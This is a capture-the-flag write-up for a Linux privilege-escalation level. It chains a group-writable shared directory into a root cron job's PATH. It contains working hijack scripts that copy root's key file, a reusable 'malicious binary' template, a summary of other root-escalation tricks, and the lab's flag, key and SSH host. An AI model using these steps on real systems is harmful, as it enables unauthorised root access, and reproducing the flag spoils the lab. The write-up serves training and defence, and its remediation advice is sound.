# L06 · Act I · Privilege Escalation — No Single Door

**MITRE tag:** T1574 — Hijack Execution Flow  
**Challenge type:** Cron PATH hijack via writable group-owned NFS share  
**Flag:** `bl_2fcc4d5b8d44029beb0cdc10843d9aab`  
**Key:** `e83eeb745e3538122321de33e79f81d3`  
**SSH:** `pe-chain@204.168.229.209 -p 2224`

---

## Challenge brief

> *"Nothing here is enough on its own. A writable path, a scheduled job, a trust that reaches off the box. Compose two or three weak links into one clean root."*

User `operator` is in the `ops` group (uid=1000, gid=101). No sudo rights, no SUID binaries, no capabilities. The title "No Single Door" is a direct description of the challenge: you must chain multiple weak things together. The box description says "Scheduled task PATH hijack through a writable shared tools export."

Three weak links, each harmless alone:
1. A directory writable by the `ops` group
2. That directory is first in the PATH of a root-owned cron job
3. The cron job calls a binary by name (not full path)

None of these three is exploitable on its own. Together, they let you plant a fake binary that the cron job executes as root.

---

## Building the concepts

### Concept 1 — What PATH is and how command lookup works

When a shell runs a command like `run-maint`, it does not know where that binary is. It looks for it by searching through a list of directories in order, left to right, and uses the first match it finds. That list is the `PATH` environment variable.

```
PATH=/srv/nfs/ops-tools:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
```

If this PATH is set and you call `run-maint`, the shell checks:
1. `/srv/nfs/ops-tools/run-maint` — found? → run it, stop searching
2. `/usr/local/sbin/run-maint` — not reached if step 1 matched
3. ...

**PATH hijacking** is placing a file you control in a directory that appears in PATH *before* the real binary. When the program runs, it finds your file first. The real binary is never reached.

The key condition: you must be able to write to one of the directories that appears *early* in the PATH.

---

### Concept 2 — What cron is and where Alpine stores cron jobs

`crond` is a system daemon that runs jobs on a schedule. It wakes up every minute, checks its configuration, and runs whatever is due.

On Alpine Linux (busybox), cron job configurations are stored at:
- `/etc/crontabs/root` — root's scheduled jobs
- `/etc/crontabs/<user>` — per-user jobs
- `/etc/periodic/` — a set of directories for jobs run at standard intervals (15min, hourly, daily, weekly, monthly) — crond automatically runs all scripts in these directories on schedule

The `/etc/periodic/` directories are world-readable. Root's crontab at `/etc/crontabs/root` is not — you get "Permission denied" reading it as a normal user.

---

### Concept 3 — NFS shares and trust across machines

NFS (Network File System) is a way to share a directory from one machine so other machines can mount and use it as if it were a local directory. In a real environment:

- A fileserver exports `/srv/nfs/ops-tools`
- Many servers mount it under the same path
- Tools published to that one directory appear on all servers

**The trust implication:** if members of the `ops` group can write to this share, they can publish new "tools" that will show up on every server that mounts it. Anything that trusts the contents of this share trusts every member of the `ops` group.

This challenge simulates that setup: `/srv/nfs/ops-tools` is a local directory playing the role of the NFS share. The hint "trust that reaches off the box" refers to how in a real NFS setup, control of this directory affects multiple machines.

---

### Concept 4 — The setgid bit on a directory

The permissions on `/srv/nfs/ops-tools` were `drwxrwsr-x`.

The `s` in the group execute position is the **setgid bit** on a directory. It does two things:
1. Group members can write files into the directory (`w` is set for group)
2. Any file created inside this directory **automatically inherits the directory's group** (`ops`), regardless of the creator's primary group

This is specifically designed for shared directories where a team needs to collaborate — every file created there belongs to the team, not to one individual's group.

For exploitation, the important part is simpler: the `w` in `rws` means the `ops` group can create files here. That's all we need.

---

## The correct approach

The attack chain, stated plainly:

1. `operator` is in `ops`
2. `ops` can write to `/srv/nfs/ops-tools`
3. Root's cron job runs `estate-backup`, which sets `PATH=/srv/nfs/ops-tools:...` and calls `run-maint` by name
4. We create `/srv/nfs/ops-tools/run-maint` — a script that runs as root when cron fires
5. That script reads root's key file and writes it to the proof file
6. We run `verify`

---

## Enumeration log

### Step 1 — Confirm who we are

```
uid=1000(operator) gid=101(ops) groups=101(ops)
```

Just the one group. No docker, no sudo, no wheel. The only interesting thing here is `ops`.

**Conclusion:** The attack surface is whatever the `ops` group gives access to. We need to find what that is.

---

### Step 2 — Try to read root's crontab directly

```bash
cat /etc/crontabs/root
```

**Result:** `Permission denied`

**Conclusion:** Root's crontab is not readable. But we know the cron daemon is part of the picture (the challenge says "scheduled task"). We need to find the cron job another way.

**Thinking:** Even though we can't read `/etc/crontabs/root`, we can still find cron-related things. On Alpine, `crond` also runs scripts from `/etc/periodic/`. That directory is world-readable. So we check there next.

---

### Step 3 — Check /etc/periodic/ directories

```bash
ls -la /etc/periodic/
ls -la /etc/periodic/15min/ /etc/periodic/hourly/ /etc/periodic/daily/
```

**Result:** All directories exist but are empty.

**Conclusion:** The cron job is not using `/etc/periodic/`. It must be defined directly in `/etc/crontabs/root` as a custom entry. That means the job runs a specific script or binary by name. We can't read the crontab, so we need to find that binary from another angle.

---

### Step 4 — Watch running processes

```bash
ps aux
```

**Result:**
```
root   8   crond -b -l 8
operator  41   /bin/sh -l
```

`crond` is running (`-b` = background daemon mode, `-l 8` = log level). No job is currently executing — we caught `ps aux` between cron firings.

**Thinking:** The job exists but is not running right now. Watching the process list over time could eventually catch it, but that's slow. A better approach: find which script the cron job calls by searching for references to the `ops` group's writable directory. We now know that directory exists from Step 2 context — we still need to find it.

---

### Step 5 — Find directories the ops group owns or can write

```bash
find / -type d -group ops 2>/dev/null
```

**Result:** Among the `/proc` noise, one real entry stood out:

```
/srv/nfs/ops-tools
```

**Conclusion:** This is the writable directory. The name tells the full story: `srv` (server data), `nfs` (network file share), `ops-tools` (tools directory for the ops group). This matches the hint "writable shared tools export" exactly.

---

### Step 6 — Confirm write access

```bash
ls -la /srv/nfs/ops-tools/
```

**Result:**
```
drwxrwsr-x 1 root ops  4096 Sep  4 14:28 .
```

- `rw` for group (`ops`) → we can create files here
- `s` (setgid) → files inherit the `ops` group
- Currently empty

**Conclusion:** We can write here. Now we need to know what binary the cron job is looking for.

---

### Step 7 — Find the script that references ops-tools

**First attempt:**
```bash
grep -r "ops-tools" / 2>/dev/null
```

**Problem:** This hung for over a minute. The reason: `/proc` contains virtual files that block indefinitely when read. `grep -r /` with no exclusions walks into `/proc` and freezes.

**Fix:** Exclude virtual filesystem paths:
```bash
grep -r "ops-tools" /etc /opt /srv /usr/local /home 2>/dev/null
```

**Result:**
```
/usr/local/sbin/estate-backup:PATH=/srv/nfs/ops-tools:/usr/local/sbin:/...
```

**Conclusion:** The script `/usr/local/sbin/estate-backup` contains our target PATH. This is the cron job's script. Reading it will tell us what binary it calls.

---

### Step 8 — Read the cron job script

```bash
cat /usr/local/sbin/estate-backup
```

**Result:**
```sh
#!/bin/sh
PATH=/srv/nfs/ops-tools:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
export PATH

run-maint >> /var/log/estate-backup.log 2>&1 || true
```

**This is the whole attack surface:**

| What | Why it matters |
|---|---|
| `PATH=/srv/nfs/ops-tools:...` | First directory is the one we control |
| `run-maint` | Called without a full path — PATH is searched |
| No `/srv/nfs/ops-tools/run-maint` exists yet | We create it |
| Script runs via root's crontab | Our `run-maint` executes as root |

**Conclusion:** The full chain is confirmed. Create `/srv/nfs/ops-tools/run-maint`, make it executable, wait for crond to fire it.

---

### Step 9 — Plant the malicious binary (round 1)

Goal: have the cron job tell us what key file exists in `/root/` (since we still don't know the exact filename), and also read its contents.

```bash
cat > /srv/nfs/ops-tools/run-maint << 'EOF'
#!/bin/sh
ls /root/ > /tmp/.root-ls
chmod 644 /tmp/.root-ls
cat /root/.pe-*-key > /tmp/.root-key 2>/dev/null
chmod 644 /tmp/.root-key
EOF
chmod +x /srv/nfs/ops-tools/run-maint
```

Wait for cron to fire, then check:

```bash
ls -la /tmp/.root-ls /tmp/.root-key
```

**Result:**
```
-rw-r--r-- 1 root root  0  Oct 24 14:28 /tmp/.root-ls
-rw-r--r-- 1 root root 32  Oct 24 14:28 /tmp/.root-key
```

**The cron job fired.** Root wrote both files.

**Observation:** `/tmp/.root-ls` is 0 bytes — empty. This is because plain `ls` skips dotfiles. The key file (like all the key files in previous levels) starts with `.`, so `ls /root/` showed nothing.

**However:** `/tmp/.root-key` has 32 bytes. The glob `cat /root/.pe-*-key` DID work — shell globs expand dotfiles even without the `-a` flag. The key is there.

```bash
cat /tmp/.root-key
# e83eeb745e3538122321de33e79f81d3
```

Key recovered. But we still don't know the proof file name. The proof file follows the pattern `/tmp/.pe-<levelname>-proof`, derived from the key file `/root/.pe-<levelname>-key`. We have the key value but not the filename.

---

### Step 10 — Why we can't just run verify yet

At this point we have the key, but running `verify` would time out. The verify script writes a request file and waits for the control plane grader to check some condition. The grader checks for a specific proof file — named after the level. We don't yet know what that file should be called.

**Thinking:** We need the key filename to derive the proof filename. The options:
1. Update `run-maint` to run `ls -la /root/` (with `-la`) to show hidden files → wait another cron cycle
2. Have `run-maint` auto-discover the key filename and write the proof file itself

Option 2 is cleaner — one more wait and we're done:

---

### Step 11 — Plant the malicious binary (round 2, self-discovering)

```bash
cat > /srv/nfs/ops-tools/run-maint << 'EOF'
#!/bin/sh
for keyfile in /root/.pe-*-key; do
    [ -f "$keyfile" ] || continue
    prooffile=$(echo "$keyfile" | sed 's/-key$/-proof/')
    cat "$keyfile" > "/tmp/$(basename "$prooffile")"
    chmod 644 "/tmp/$(basename "$prooffile")"
done
EOF
```

**What this does:**
- Globs all `.pe-*-key` files in `/root/`
- For each one, derives the matching proof filename by replacing `-key` with `-proof`
- Writes the key content to `/tmp/.pe-<levelname>-proof`

Wait for cron, then check:

```bash
ls /tmp/.pe-*-proof 2>/dev/null
```

**Result:** `/tmp/.pe-chain-proof`

Level name is `pe-chain`. The proof file exists with the right content.

---

### Step 12 — Run verify

```bash
verify
```

**Result:**
```
Verifying...
Level solved: pe-chain
Your flag: bl_2fcc4d5b8d44029beb0cdc10843d9aab
```

---

## What the vulnerability was

**T1574 — Hijack Execution Flow (PATH hijacking)**

No single thing here was the vulnerability. The vulnerability was the combination:

| Weak link | What it is | Why it's not enough alone |
|---|---|---|
| `ops` group has write access to `/srv/nfs/ops-tools` | A group-writable shared directory | Useless unless something trusted reads from it |
| `estate-backup` puts `/srv/nfs/ops-tools` first in PATH | A cron script trusts a group-writable directory | Useless unless a root process uses this PATH |
| Cron runs `estate-backup` as root on a schedule | A root-owned scheduled job | Useless unless it calls something via PATH we control |

The real mistake: the `ops` group should not have write access to any directory that appears in root's PATH. The principle is simple — root's PATH should only include directories that only root can write to.

**The defender's fix:**
- Use absolute paths in cron scripts: `PATH=...` in a cron script should never include directories writable by non-root users
- Or: call `run-maint` as `/usr/local/sbin/run-maint` — a full path bypasses PATH lookup entirely
- Audit group memberships: the `ops` group having write access to a "shared tools" directory is a design flaw if those tools are trusted by privileged processes

---

## Dead ends

### /etc/periodic/ was empty

Checked `/etc/periodic/{15min,hourly,daily}` — all empty. On Alpine, this is where crond runs standard-interval scripts from. The level's cron job is in `/etc/crontabs/root` as a custom entry with a specific schedule. Ruling out `/etc/periodic/` told us to look elsewhere for how to discover the job.

### grep -r / hanged

Running `grep -r "ops-tools" /` froze immediately. The cause: `/proc` is a virtual filesystem where some files block indefinitely on read. `grep -r /` walks into `/proc` and hangs. Fix: always scope `grep -r` to real filesystem paths (`/etc /opt /srv /usr/local /home`).

### ls /root/ showed nothing (dotfiles)

After the first cron run, `/tmp/.root-ls` was empty even though a key file exists in `/root/`. The reason: plain `ls` skips dotfiles (files starting with `.`). The glob `cat /root/.pe-*-key` works because shell globs expand dotfiles. Always use `ls -la` when you care about hidden files.

---

## Act I completed

This was the last level of Act I (Privilege Escalation). Levels L00–L06 covered:

| Level | Technique | How root was reached |
|---|---|---|
| L00 | Recon | Existing SUID/world-readable root access |
| L01 | SUID binary | Direct `euid=0` via SUID bit on a shell |
| L02 | sudo misconfig | `sudo gawk` with `BEGIN { system("/bin/sh") }` |
| L03 | Linux capabilities | `cap_setuid=ep` binary executes shell as UID 0 |
| L04 | CVE-2023-22809 | sudoedit argument injection opens arbitrary file |
| L05 | Docker group | Volume mount via `docker run -v /:/host` |
| L06 | PATH hijack | Cron job uses writable PATH directory → fake binary runs as root |

---

## Carryover findings

None.

---

## Command reference

```bash
# Find directories writable by your group (replace ops with your group)
find / -type d -group ops 2>/dev/null

# Check cron files you can actually read
ls /etc/crontabs/
ls /etc/periodic/15min/ /etc/periodic/hourly/ /etc/periodic/daily/

# Find scripts that reference a suspicious path (avoid /proc)
grep -r "<path>" /etc /opt /srv /usr/local /home 2>/dev/null

# Check directory permissions (look for setgid 's' in group position)
ls -la /srv/nfs/ops-tools/

# Write a malicious binary to the writable PATH directory
cat > /writable/dir/binary-name << 'EOF'
#!/bin/sh
<commands run as root>
EOF
chmod +x /writable/dir/binary-name

# Self-discovering proof writer (auto-derives proof name from key filename)
for keyfile in /root/.pe-*-key; do
    [ -f "$keyfile" ] || continue
    prooffile=$(echo "$keyfile" | sed 's/-key$/-proof/')
    cat "$keyfile" > "/tmp/$(basename "$prooffile")"
    chmod 644 "/tmp/$(basename "$prooffile")"
done

# Wait for cron file to appear (poll manually)
ls /tmp/.pe-*-proof 2>/dev/null
```